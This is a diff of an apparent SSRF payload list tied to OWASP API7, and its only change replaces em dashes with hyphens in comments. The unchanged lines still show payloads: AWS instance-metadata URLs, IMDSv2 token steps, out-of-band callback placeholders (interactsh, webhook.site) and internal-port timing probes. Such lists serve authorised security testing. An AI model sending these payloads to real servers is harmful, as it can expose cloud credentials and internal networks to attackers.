@@ -1,5 +1,5 @@
-# API SSRF Payloads — Server-Side Request Forgery
-# OWASP API Security: API7 — Server Side Request Forgery
+# API SSRF Payloads - Server-Side Request Forgery
+# OWASP API Security: API7 - Server Side Request Forgery
 # Severity: HIGH to CRITICAL
 
 # ============================================================
@@ -15,7 +15,7 @@ http://169.254.169.254/latest/meta-data/hostname
 http://169.254.169.254/latest/meta-data/local-ipv4
 http://169.254.169.254/latest/dynamic/instance-identity/document
 
-# AWS IMDSv2 (requires token — SSRF still possible if server follows redirects)
+# AWS IMDSv2 (requires token - SSRF still possible if server follows redirects)
 # Step 1: PUT http://169.254.169.254/latest/api/token (X-aws-ec2-metadata-token-ttl-seconds: 21600)
 # Step 2: GET with token header
 
@@ -204,5 +204,5 @@ http://YOUR_INTERACTSH_URL
 https://webhook.site/YOUR_UUID
 
 # Time-based detection (connect to closed port = timeout)
-http://127.0.0.1:1 (closed port — if response is slow, SSRF confirmed)
+http://127.0.0.1:1 (closed port - if response is slow, SSRF confirmed)
 http://192.168.1.1:1 (try internal ranges for timing differences)
